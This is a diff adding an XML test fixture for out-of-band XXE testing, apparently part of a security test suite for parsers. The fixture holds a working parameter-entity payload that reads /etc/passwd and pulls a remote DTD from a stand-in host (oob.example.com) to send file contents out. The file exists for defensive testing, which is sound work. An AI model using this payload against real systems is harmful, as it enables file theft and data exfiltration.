@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Out-of-band / parameter-entity XXE. MANUAL / DOCUMENTED PAYLOAD ONLY.
+     This fixture is NOT consumed by an automated in-band assertion: its only
+     signal is an outbound fetch to a collaborator/canary, which a same-response
+     ``marker not in body`` check can never observe (it would pass even against
+     a vulnerable parser, masking the finding). test_xxe_external_entity asserts
+     on xxe_classic.xml (in-band observable) instead; this payload is kept for
+     manual use against an out-of-band collaborator/canary listener.
+
+     Uses a parameter entity (%) that would, on a vulnerable parser, pull a
+     remote DTD and exfiltrate file contents over an outbound channel. The
+     SYSTEM target is a reserved-documentation host (RFC 2606 example.com) so
+     the fixture itself initiates no live exfiltration when stored or read
+     offline. A safe parser MUST NOT fetch the external DTD and MUST NOT
+     resolve the entity: no outbound request, no file content reflected. -->
+<!DOCTYPE records [
+  <!ENTITY % ext SYSTEM "http://oob.example.com/xxe.dtd">
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  %ext;
+]>
+<records>
+  <record>
+    <id>STAGE-XXE-OOB</id>
+    <value>oob-probe</value>
+  </record>
+</records>
